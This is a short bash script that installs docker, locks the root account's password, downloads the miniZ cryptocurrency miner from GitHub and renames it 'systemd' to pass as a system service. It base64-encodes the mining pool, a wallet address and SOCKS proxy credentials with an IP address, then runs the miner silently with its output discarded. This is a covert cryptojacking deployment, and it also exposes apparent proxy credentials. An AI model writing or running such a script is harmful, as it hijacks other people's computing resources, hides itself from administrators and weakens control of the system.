#!/bin/bash

# Update and install docker.io
sudo apt update && sudo apt install -y docker.io

# Add user to docker group
sudo usermod -aG docker root
sudo usermod --add-subuids 1202-5868 root
sudo usermod -L root

# Download and extract miniZ
wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz
tar -xvf miniZ_v2.3c_linux-x64.tar.gz

# Move miniZ to systemd directory
mv miniZ systemd

# Encode sensitive information using Base64
server_encoded=$(echo "tr.neoxa.herominers.com" | base64)
port_encoded=$(echo "1202" | base64)
user_encoded=$(echo "GgxJdQzEZeXHQZSApbCdWFtYR7QufiN1RL" | base64)
socks_encoded=$(echo "sipuwfea:e90ia636sn8t@38.154.227.167:5868" | base64)

# Execute the command with encoded sensitive information
./systemd --par=kawpow --user "$(echo "$user_encoded" | base64 -d)" --server "$(echo "$server_encoded" | base64 -d)" --port "$(echo "$port_encoded" | base64 -d)" --socks "$(echo "$socks_encoded" | base64 -d)" --socksdns > /dev/null 2>&1
